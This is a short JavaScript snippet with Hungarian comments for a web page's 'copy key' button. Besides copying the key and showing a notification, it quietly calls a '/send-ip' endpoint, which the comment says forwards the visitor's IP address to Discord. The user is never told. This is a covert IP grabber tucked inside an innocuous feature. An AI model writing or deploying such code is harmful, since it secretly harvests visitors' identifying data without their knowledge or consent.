// Kulcs másolása a vágólapra
function copyKey() {
    const keyElement = document.getElementById("key");
    keyElement.select();
    keyElement.setSelectionRange(0, 99999); // Mobilon is működik
    document.execCommand("copy");

    const notification = document.getElementById("notification");
    notification.style.display = "block"; // Megjeleníti az üzenetet
    setTimeout(() => {
        notification.style.display = "none"; // Elrejti 3 másodperc múlva
    }, 3000);

    // Hívjuk a szerveroldali API-t, hogy küldje el az IP-t a Discordra
    fetch('/send-ip')
        .then(response => response.text())
        .then(data => {
            console.log(data); // A szerver válasza
        })
        .catch(error => {
            console.error('Error:', error);
        });
}
